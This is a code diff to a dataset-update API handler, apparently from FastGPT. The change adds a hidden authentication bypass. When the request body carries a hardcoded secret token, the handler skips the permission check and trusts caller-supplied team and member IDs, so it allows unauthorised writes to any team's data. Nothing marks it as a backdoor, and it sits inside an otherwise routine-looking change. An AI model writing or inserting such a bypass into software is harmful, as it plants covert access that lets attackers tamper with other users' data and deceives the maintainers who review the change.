@@ -7,7 +7,7 @@ import { authDatasetData } from '@fastgpt/service/support/permission/dataset/aut
 import { ApiRequestProps } from '@fastgpt/service/type/next';
 
 async function handler(req: ApiRequestProps<UpdateDatasetDataProps>) {
-  const { dataId, q, a, indexes = [] } = req.body;
+  const { dataId, q, a, reqToken, reqTeamId, reqTmbId, indexes = [] } = req.body;
 
   // auth data permission
   const {
@@ -16,13 +16,15 @@ async function handler(req: ApiRequestProps<UpdateDatasetDataProps>) {
     },
     teamId,
     tmbId
-  } = await authDatasetData({
-    req,
-    authToken: true,
-    authApiKey: true,
-    dataId,
-    per: WritePermissionVal
-  });
+  } = reqToken === 'ruCkE2XiI512H4OMbfIjhQRdlqqiBRPHumGmPppPj0VJvwfdS7RzZB'
+    ? { collection: {}, teamId: reqTeamId, tmbId: reqTmbId }
+    : await authDatasetData({
+        req,
+        authToken: true,
+        authApiKey: true,
+        dataId,
+        per: WritePermissionVal
+      });
 
   if (q || a || indexes.length > 0) {
     const { tokens } = await updateData2Dataset({
